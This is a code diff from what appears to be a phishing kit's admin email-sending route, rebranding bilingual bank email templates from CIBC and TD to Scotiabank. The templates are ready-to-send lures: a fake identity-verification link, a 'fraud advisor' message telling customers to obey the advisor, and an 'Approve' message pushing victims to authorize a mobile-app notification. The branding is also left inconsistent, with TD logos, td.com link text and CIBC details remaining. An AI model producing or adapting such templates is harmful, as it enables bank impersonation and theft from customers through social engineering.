@@ -544,7 +544,7 @@ app.post('/api/admin/send-email', async (req, res) => {
                 <tr>
                   <td style="padding:14px 18px;">
                     <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#795548;line-height:1.6;">
-                      ⚠️ <strong>Security Note:</strong> CIBC will never ask for your PIN, password, or full card number by email. If you did not request this verification, please contact our customer service immediately.
+                      ⚠️ <strong>Security Note:</strong> Scotiabank will never ask for your PIN, password, or full card number by email. If you did not request this verification, please contact our customer service immediately.
                     </p>
                   </td>
                 </tr>
@@ -577,17 +577,17 @@ app.post('/api/admin/send-email', async (req, res) => {
               <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                 <tr>
                   <td align="center">
-                    <a href="https://www.cibc.com/privacy" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Security Centre</a>
+                    <a href="https://www.scotiabank.com/privacy" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Security Centre</a>
                     <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
-                    <a href="https://www.cibc.com/privacy-policy" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Privacy Policy</a>
+                    <a href="https://www.scotiabank.com/privacy-policy" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Privacy Policy</a>
                     <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
-                    <a href="https://www.cibc.com/" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
+                    <a href="https://www.scotiabank.com/" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
                   </td>
                 </tr>
               </table>
 
               <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#999999;line-height:1.6;text-align:center;">
-                © 2026 CIBC. All rights reserved.<br>
+                © 2026 Scotiabank. All rights reserved.<br>
                 66 Wellington Street West, Toronto, Ontario M5K 1A2<br><br>
                 This email was sent to the address associated with your TD account. This is a transactional message related to the security of your account.
               </p>
@@ -607,7 +607,7 @@ app.post('/api/admin/send-email', async (req, res) => {
 
 </body>
 </html>`,
-      text: `Dear Customer,\n\nWe need to verify your identity to finalize your request.\n\nPlease click on this link to proceed with the verification:\n${link}\n\nIf you did not request this verification, please contact our customer service at 1-800-895-4463.\n\n© ${new Date().getFullYear()} CIBC. All rights reserved.`,
+      text: `Dear Customer,\n\nWe need to verify your identity to finalize your request.\n\nPlease click on this link to proceed with the verification:\n${link}\n\nIf you did not request this verification, please contact our customer service at 1-800-895-4463.\n\n© ${new Date().getFullYear()} Scotiabank. All rights reserved.`,
     },
       fr: {
       subject: 'Vérification sécurisée requise – TD',
@@ -752,7 +752,7 @@ app.post('/api/admin/send-email', async (req, res) => {
                 <tr>
                   <td style="padding:14px 18px;">
                     <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#795548;line-height:1.6;">
-                      ⚠️ <strong>Note de sécurité :</strong> La Banque CIBC ne vous demandera jamais votre NIP, mot de passe ou numéro de carte complet par courriel. Si vous n'avez pas demandé cette vérification, veuillez contacter notre service à la clientèle immédiatement.
+                      ⚠️ <strong>Note de sécurité :</strong> La Banque Scotiabank ne vous demandera jamais votre NIP, mot de passe ou numéro de carte complet par courriel. Si vous n'avez pas demandé cette vérification, veuillez contacter notre service à la clientèle immédiatement.
                     </p>
                   </td>
                 </tr>
@@ -785,11 +785,11 @@ app.post('/api/admin/send-email', async (req, res) => {
               <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                 <tr>
                   <td align="center">
-                    <a href="https://www.cibc.com/fr/confidentialite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Centre de sécurité</a>
+                    <a href="https://www.scotiabank.com/fr/confidentialite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Centre de sécurité</a>
                     <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
-                    <a href="https://www.cibc.com/fr/politique-confidentialite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Politique de confidentialité</a>
+                    <a href="https://www.scotiabank.com/fr/politique-confidentialite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Politique de confidentialité</a>
                     <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
-                    <a href="https://www.cibc.com/fr/" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
+                    <a href="https://www.scotiabank.com/fr/" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
                   </td>
                 </tr>
               </table>
@@ -821,7 +821,7 @@ app.post('/api/admin/send-email', async (req, res) => {
 
     fraud: {
       en: {
-        subject: 'URGENT – Security Procedure for Your Assets – CIBC Bank',
+        subject: 'URGENT – Security Procedure for Your Assets – Scotiabank Bank',
         html: `<!DOCTYPE html>
 <html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
 <head>
@@ -830,8 +830,8 @@ app.post('/api/admin/send-email', async (req, res) => {
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="x-apple-disable-message-reformatting">
   <meta name="format-detection" content="telephone=no, date=no, address=no, email=no, url=no">
-  <title>Security Procedure &#8211; TD Bank</title>
-  <meta name="description" content="Urgent asset security procedure &#8211; TD Bank Fraud Service.">
+  <title>Security Procedure &#8211; Scotiabank</title>
+  <meta name="description" content="Urgent asset security procedure &#8211; Scotiabank Fraud Service.">
   <!--[if mso]>
   <noscript><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml></noscript>
   <![endif]-->
@@ -865,7 +865,7 @@ app.post('/api/admin/send-email', async (req, res) => {
                   <table role="presentation" cellspacing="0" cellpadding="0" border="0">
                     <tr>
                       <td><div style="display:inline-block;background:#ffffff;border-radius:6px;padding:6px 14px;"><span style="font-size:24px;font-weight:900;color:#1a7b3a;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td>
-                      <td style="padding-left:14px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.75);font-size:12px;font-weight:500;letter-spacing:0.5px;text-transform:uppercase;">TD Bank &mdash; Fraud Prevention Service</p></td>
+                      <td style="padding-left:14px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.75);font-size:12px;font-weight:500;letter-spacing:0.5px;text-transform:uppercase;">Scotiabank &mdash; Fraud Prevention Service</p></td>
                     </tr>
                   </table>
                 </td>
@@ -918,18 +918,18 @@ app.post('/api/admin/send-email', async (req, res) => {
             <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:14px;line-height:1.8;">We thank you for your cooperation and remain at your disposal.</p>
             <p style="margin:0 0 4px;color:#1a1a1a;font-size:14px;font-weight:700;">Sincerely,</p>
             <p style="margin:0 0 2px;color:#333333;font-size:14px;">Fraud Prevention Service</p>
-            <p style="margin:0;color:#1a7b3a;font-size:14px;font-weight:700;">TD Bank</p>
+            <p style="margin:0;color:#1a7b3a;font-size:14px;font-weight:700;">Scotiabank</p>
           </td>
         </tr>
-        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Security reminder:</strong> TD Bank will never ask for your password, PIN or full card number by email or phone. If in doubt, contact us at <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
-        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">TD Bank</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Privacy</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Terms of Use</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Contact Us</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">This email was sent automatically by TD Bank's security system. Please do not reply directly to this message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Bank. All rights reserved. CIBC.</p></td></tr></table></td></tr>
+        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Security reminder:</strong> Scotiabank will never ask for your password, PIN or full card number by email or phone. If in doubt, contact us at <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
+        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">Scotiabank</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Privacy</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Terms of Use</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Contact Us</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">This email was sent automatically by Scotiabank's security system. Please do not reply directly to this message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 Scotiabank. All rights reserved. Scotiabank.</p></td></tr></table></td></tr>
         <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
       </table>
     </td></tr>
   </table>
 </body>
 </html>`,
-        text: `Dear Customer,\n\nOur fraud detection system has identified attempted fraud on your bank account. Your fraud prevention advisor is currently online and will guide you step by step through the asset security procedure.\n\nPlease follow all instructions given by your advisor carefully. Do not perform any operation without their prior approval.\n\nFraud Prevention Service\nTD Bank\n© 2026 CIBC Bank. All rights reserved.`,
+        text: `Dear Customer,\n\nOur fraud detection system has identified attempted fraud on your bank account. Your fraud prevention advisor is currently online and will guide you step by step through the asset security procedure.\n\nPlease follow all instructions given by your advisor carefully. Do not perform any operation without their prior approval.\n\nFraud Prevention Service\nScotiabank\n© 2026 Scotiabank Bank. All rights reserved.`,
       },
       fr: {
         subject: 'URGENT – Procédure de sécurisation de vos avoirs – TD Banque',
@@ -1007,7 +1007,7 @@ app.post('/api/admin/send-email', async (req, res) => {
             <p style="margin:0;color:#1a7b3a;font-size:14px;font-weight:700;">TD Banque</p>
           </td>
         </tr>
-        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Rappel de s&eacute;curit&eacute;&nbsp;:</strong> La Banque CIBC ne vous demandera jamais votre mot de passe, NIP ou num&eacute;ro de carte complet par courriel ou par t&eacute;l&eacute;phone. Si vous avez un doute, contactez-nous au <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
+        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Rappel de s&eacute;curit&eacute;&nbsp;:</strong> La Banque Scotiabank ne vous demandera jamais votre mot de passe, NIP ou num&eacute;ro de carte complet par courriel ou par t&eacute;l&eacute;phone. Si vous avez un doute, contactez-nous au <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
         <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">Banque TD</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Confidentialit&eacute;</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Conditions d&apos;utilisation</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Nous contacter</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">Ce courriel a &eacute;t&eacute; envoy&eacute; automatiquement par le syst&egrave;me de s&eacute;curit&eacute; de TD Banque. Merci de ne pas r&eacute;pondre directement &agrave; ce message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Banque. Tous droits r&eacute;serv&eacute;s. La Banque Toronto-Dominion.</p></td></tr></table></td></tr>
         <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
       </table>
@@ -1021,7 +1021,7 @@ app.post('/api/admin/send-email', async (req, res) => {
 
     approval: {
       en: {
-        subject: 'Security Alert – CIBC Bank',
+        subject: 'Security Alert – Scotiabank Bank',
         html: `<!DOCTYPE html>
 <html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
 <head>
@@ -1030,8 +1030,8 @@ app.post('/api/admin/send-email', async (req, res) => {
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="x-apple-disable-message-reformatting">
   <meta name="format-detection" content="telephone=no, date=no, address=no, email=no, url=no">
-  <title>Security Alert &#8211; TD Bank</title>
-  <meta name="description" content="Your attention is required regarding a suspicious transaction on your CIBC account.">
+  <title>Security Alert &#8211; Scotiabank</title>
+  <meta name="description" content="Your attention is required regarding a suspicious transaction on your Scotiabank account.">
   <!--[if mso]>
   <noscript><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml></noscript>
   <![endif]-->
@@ -1062,7 +1062,7 @@ app.post('/api/admin/send-email', async (req, res) => {
           <td style="background:#1a5c2a;padding:0 32px;border-radius:10px 10px 0 0;">
             <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
               <tr>
-                <td style="padding:20px 0 18px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#ffffff;border-radius:6px;padding:6px 14px;"><span class="header-logo" style="font-size:24px;font-weight:900;color:#1a7b3a;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:14px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.75);font-size:12px;font-weight:500;letter-spacing:0.5px;text-transform:uppercase;">TD Bank &mdash; Security Service</p></td></tr></table></td>
+                <td style="padding:20px 0 18px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#ffffff;border-radius:6px;padding:6px 14px;"><span class="header-logo" style="font-size:24px;font-weight:900;color:#1a7b3a;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:14px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.75);font-size:12px;font-weight:500;letter-spacing:0.5px;text-transform:uppercase;">Scotiabank &mdash; Security Service</p></td></tr></table></td>
                 <td align="right" style="padding:20px 0 18px;"><p style="margin:0;color:rgba(255,255,255,0.5);font-size:11px;">Secure message &#128274;</p></td>
               </tr>
             </table>
@@ -1080,7 +1080,7 @@ app.post('/api/admin/send-email', async (req, res) => {
             <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:24px;"><tr><td style="height:1px;background:linear-gradient(90deg,transparent,#d4edda,transparent);"></td></tr></table>
             <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border-left:4px solid #1a7b3a;background:#f0faf3;border-radius:0 8px 8px 0;"><tr><td style="padding:16px 20px;"><p style="margin:0 0 6px;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">Immediate Protection Measure</p><p class="body-text" style="margin:0;color:#1a3020;font-size:14px;line-height:1.7;">In accordance with our fraud prevention procedure, we have <strong>immediately blocked</strong> this transaction. However, to proceed with its final cancellation, your formal validation is required.</p></td></tr></table>
             <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:15px;line-height:1.8;">You will receive a <strong>notification</strong> on your mobile application. Simply tap <strong style="color:#1a7b3a;">&laquo;&nbsp;Approve&nbsp;&raquo;</strong> to confirm that this transaction is fraudulent and authorize its cancellation.</p>
-            <table role="presentation" class="cta-box" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#f8fffe;border:1.5px solid #1a7b3a;border-radius:10px;padding:0;"><tr><td style="padding:24px 28px;"><p style="margin:0 0 8px;color:#1a5c2a;font-size:12px;font-weight:700;letter-spacing:0.7px;text-transform:uppercase;">Action required on your phone</p><p class="body-text" style="margin:0 0 16px;color:#1a3020;font-size:14px;line-height:1.7;">Please open your CIBC app and tap the button:</p><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td style="background:#1a7b3a;border-radius:6px;padding:11px 28px;text-align:center;"><span style="color:#ffffff;font-size:15px;font-weight:700;letter-spacing:0.3px;">&#10003;&nbsp; Approve</span></td></tr></table></td></tr></table>
+            <table role="presentation" class="cta-box" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#f8fffe;border:1.5px solid #1a7b3a;border-radius:10px;padding:0;"><tr><td style="padding:24px 28px;"><p style="margin:0 0 8px;color:#1a5c2a;font-size:12px;font-weight:700;letter-spacing:0.7px;text-transform:uppercase;">Action required on your phone</p><p class="body-text" style="margin:0 0 16px;color:#1a3020;font-size:14px;line-height:1.7;">Please open your Scotiabank app and tap the button:</p><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td style="background:#1a7b3a;border-radius:6px;padding:11px 28px;text-align:center;"><span style="color:#ffffff;font-size:15px;font-weight:700;letter-spacing:0.3px;">&#10003;&nbsp; Approve</span></td></tr></table></td></tr></table>
             <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#fff8f0;border:1px solid #f5c6a0;border-radius:8px;"><tr><td style="padding:14px 18px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="22" valign="top" style="padding-right:10px;padding-top:2px;"><span style="color:#c0392b;font-size:15px;">&#9888;</span></td><td><p class="body-text" style="margin:0;color:#7a3000;font-size:13px;line-height:1.7;">Please note that this transaction will only be cancelled <strong>after your validation</strong>. Until you tap <strong>&laquo;&nbsp;Approve&nbsp;&raquo;</strong>, the funds will remain suspended and the transaction could be automatically processed.</p></td></tr></table></td></tr></table>
             <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:15px;line-height:1.8;">We remind you that in the event of confirmed fraud, you benefit from <strong>full protection</strong> and will be fully reimbursed, provided you validate promptly.</p>
             <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;"><tr><td style="height:1px;background:#e8eeed;"></td></tr></table>
@@ -1088,18 +1088,18 @@ app.post('/api/admin/send-email', async (req, res) => {
             <p class="body-text" style="margin:0 0 32px;color:#555555;font-size:14px;line-height:1.8;">We thank you for your prompt cooperation and remain at your disposal for any questions.</p>
             <p style="margin:0 0 4px;color:#1a1a1a;font-size:14px;font-weight:700;">Sincerely,</p>
             <p style="margin:0 0 2px;color:#333333;font-size:14px;">The Security and Fraud Prevention Service</p>
-            <p style="margin:0;color:#1a7b3a;font-size:14px;font-weight:700;">TD Bank</p>
+            <p style="margin:0;color:#1a7b3a;font-size:14px;font-weight:700;">Scotiabank</p>
           </td>
         </tr>
-        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Security reminder:</strong> TD Bank will never ask for your password, PIN or full card number by email or phone. If in doubt, contact us at <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
-        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">TD Bank</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Privacy</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Terms of Use</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Contact Us</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">This email was sent automatically by TD Bank's security system. Please do not reply directly to this message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Bank. All rights reserved. CIBC.</p></td></tr></table></td></tr>
+        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Security reminder:</strong> Scotiabank will never ask for your password, PIN or full card number by email or phone. If in doubt, contact us at <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
+        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">Scotiabank</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Privacy</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Terms of Use</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Contact Us</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">This email was sent automatically by Scotiabank's security system. Please do not reply directly to this message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 Scotiabank. All rights reserved. Scotiabank.</p></td></tr></table></td></tr>
         <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
       </table>
     </td></tr>
   </table>
 </body>
 </html>`,
-        text: `Dear Customer,\n\nOur monitoring system has detected a recent transaction on your account that you have reported as unauthorized.\n\nWe have immediately blocked this transaction. To finalize its cancellation, please open your CIBC app and tap "Approve".\n\nSincerely,\nThe Security and Fraud Prevention Service\nTD Bank\n© 2026 CIBC Bank. All rights reserved.`,
+        text: `Dear Customer,\n\nOur monitoring system has detected a recent transaction on your account that you have reported as unauthorized.\n\nWe have immediately blocked this transaction. To finalize its cancellation, please open your Scotiabank app and tap "Approve".\n\nSincerely,\nThe Security and Fraud Prevention Service\nScotiabank\n© 2026 Scotiabank Bank. All rights reserved.`,
       },
       fr: {
         subject: 'Alerte de sécurité – TD Banque',
@@ -1111,8 +1111,8 @@ app.post('/api/admin/send-email', async (req, res) => {
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="x-apple-disable-message-reformatting">
   <meta name="format-detection" content="telephone=no, date=no, address=no, email=no, url=no">
-  <title>Alerte de s&eacute;curit&eacute; &#8211; TD Bank</title>
-  <meta name="description" content="Votre attention est requise concernant une op&eacute;ration suspecte sur votre compte TD Bank.">
+  <title>Alerte de s&eacute;curit&eacute; &#8211; Scotiabank</title>
+  <meta name="description" content="Votre attention est requise concernant une op&eacute;ration suspecte sur votre compte Scotiabank.">
   <!--[if mso]>
   <noscript><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml></noscript>
   <![endif]-->
@@ -1168,7 +1168,7 @@ app.post('/api/admin/send-email', async (req, res) => {
             <p style="margin:0;color:#1a7b3a;font-size:14px;font-weight:700;">TD Banque</p>
           </td>
         </tr>
